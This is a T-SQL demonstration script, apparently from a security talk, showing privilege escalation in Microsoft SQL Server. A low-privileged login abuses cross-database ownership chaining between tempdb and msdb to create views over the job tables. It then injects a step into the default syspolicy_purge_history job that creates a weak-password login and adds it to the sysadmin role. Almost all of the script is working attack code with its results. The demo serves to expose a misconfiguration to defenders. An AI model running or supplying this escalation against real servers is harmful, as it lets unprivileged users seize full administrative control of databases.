/*
  Your MSSQL environment is vulnerable and I can prove it!
  Author: Fabiano Amorim | fabianonevesamorim@hotmail.com
*/

/* Using AppDemo2, let’s try to access table sysjobs on msdb. */
USE tempdb
GO
EXECUTE AS LOGIN = 'AppDemo2';
GO
-- AppDemo2 does not have direct permission on msdb tables
SELECT * FROM msdb.dbo.sysjobs
GO
REVERT;
GO
/*
Msg 229, Level 14, State 5, Line 19
The SELECT permission was denied on the object 'sysjobs', database 'msdb', schema 'dbo'.
*/

/* 
  From the attacker’s perspective, this failure confirms that direct access to msdb is blocked, 
  but it also highlights an opportunity. 
  Because both tempdb and msdb have ownership chaining enabled and share the same owner (sa), 
  a chained object can be used to bypass this restriction.
  Checking which databases have db chaining enabled:
*/
-- is_db_chaining_on on both DBs tempdb and msdb are set to ON
SELECT name, owner_sid, is_db_chaining_on 
FROM sys.databases
WHERE is_db_chaining_on = 1
GO
/*
name         owner_sid     is_db_chaining_on
------------ ------------- -----------------
master       0x01          1
tempdb       0x01          1
msdb         0x01          1

(3 rows affected)
*/

/* Database chaining is enabled on both tempdb and msdb, which means I can do the following: */
USE tempdb
GO
EXECUTE AS LOGIN = 'AppDemo2';
GO
DROP VIEW IF EXISTS vw_sysjobs
GO
CREATE VIEW vw_sysjobs
AS
SELECT * FROM msdb.dbo.sysjobs
GO
-- And rely on ownership chaining to get access msdb.dbo.sysjobs
SELECT job_id, name, enabled, owner_sid, SUSER_SNAME(owner_sid) AS job_owner 
FROM vw_sysjobs 
WHERE name = 'syspolicy_purge_history'
GO
REVERT;
GO
/*
Results:
job_id                               name                         enabled owner_sid   job_owner
------------------------------------ ---------------------------- ------- ----------- -----------
761A6AFC-BE7E-4A82-A021-A7B687AD3F63 syspolicy_purge_history      1       0x01        sa

(1 row affected)
*/

/*
  By placing a view in tempdb that references msdb objects, 
  SQL Server treats access to the underlying msdb tables as trusted, even though no explicit permissions were granted.
  By default, every SQL Server instance has a job called syspolicy_purge_history which runs (typically 2 AM). 
  We could use this job to inject some code to be executed in the job context (sa login). 
  For instance, I could add a new step and wait for its next execution.
*/
USE tempdb
GO
EXECUTE AS LOGIN = 'AppDemo2';
GO
DROP VIEW IF EXISTS vw_sysjobsteps
GO
CREATE VIEW vw_sysjobsteps
AS
SELECT * FROM msdb.dbo.sysjobsteps
GO

-- Inserting a new step to create a sysadmin login
DELETE FROM vw_sysjobsteps
WHERE job_id = (SELECT job_id 
                  FROM vw_sysjobs 
                 WHERE name = 'syspolicy_purge_history')
AND step_id = 4
GO
DECLARE @step_uid VARCHAR(250) = NEWID()
INSERT INTO vw_sysjobsteps ([job_id], [step_id], [step_name], [subsystem], [command], [flags], [additional_parameters], [cmdexec_success_code], [on_success_action], [on_success_step_id], [on_fail_action], [on_fail_step_id], [server], [database_name], [database_user_name], [retry_attempts], [retry_interval], [os_run_priority], [output_file_name], [last_run_outcome], [last_run_duration], [last_run_retries], [last_run_date], [last_run_time], [proxy_id], [step_uid])
VALUES (
(SELECT job_id FROM vw_sysjobs WHERE name = 'syspolicy_purge_history'), 
4, 
'Run my elevated code', 
'TSQL',
'-- If login does not exist, create it
IF NOT EXISTS(SELECT * FROM sys.server_principals WHERE name = ''*** Demo 2 - I Should Not Be Here I''''m a SysAdmin now ***'')
BEGIN
  CREATE LOGIN [*** Demo 2 - I Should Not Be Here I''m a SysAdmin now ***] WITH PASSWORD=N''102030'', CHECK_POLICY=OFF;
  ALTER SERVER ROLE [sysadmin] ADD MEMBER [*** Demo 2 - I Should Not Be Here I''m a SysAdmin now ***];
END',
0, NULL, 0, 1, 0, 1, 0, NULL, N'master', NULL, 0, 0, 0, NULL, 0, 0, 0, 0, 0, NULL, @step_uid
)
GO
-- Adjust on_success_action for step 3
UPDATE vw_sysjobsteps SET on_success_action = 3
FROM vw_sysjobsteps
WHERE job_id = (SELECT job_id 
                  FROM vw_sysjobs 
                 WHERE name = 'syspolicy_purge_history')
AND step_id = 3
GO
-- Job has 4 steps.
SELECT job_id, step_id, step_name, on_success_action
FROM vw_sysjobsteps
WHERE job_id = (SELECT job_id 
                  FROM vw_sysjobs 
                 WHERE name = 'syspolicy_purge_history')
GO
REVERT;
GO
/*
Results:
job_id                 step_id     step_name                             on_success_action
-------------------... ----------- ------------------------------------- ----------
761A6AFC-BE7E-4A82-... 1           Verify that automation is enabled.    3
761A6AFC-BE7E-4A82-... 2           Purge history.                        3
761A6AFC-BE7E-4A82-... 3           Erase Phantom System Health Records.  3
761A6AFC-BE7E-4A82-... 4           Run my elevated code                  1

(4 rows affected)
*/

/*
  Now, we could wait until next execution and our code will be executed under sysadmin context. 
  You can use the following code to manually start the job in case you don’t want to wait until next execution.
*/
-- Force job execution using a high priv account to be able to call 
EXECUTE msdb.dbo.sp_start_job N'syspolicy_purge_history';
GO

/*
  Verify escalation: use the UI to show the [*** Demo 2 - I Should Not Be Here I''m a SysAdmin now ***]
*/
SELECT
  SUSER_ID('*** Demo 2 - I Should Not Be Here I''m a SysAdmin now ***') AS loginid,
  IS_SRVROLEMEMBER('sysadmin', '*** Demo 2 - I Should Not Be Here I''m a SysAdmin now ***') AS is_sysadmin;
GO
/*
loginid     is_sysadmin
----------- ----------
381         1
*/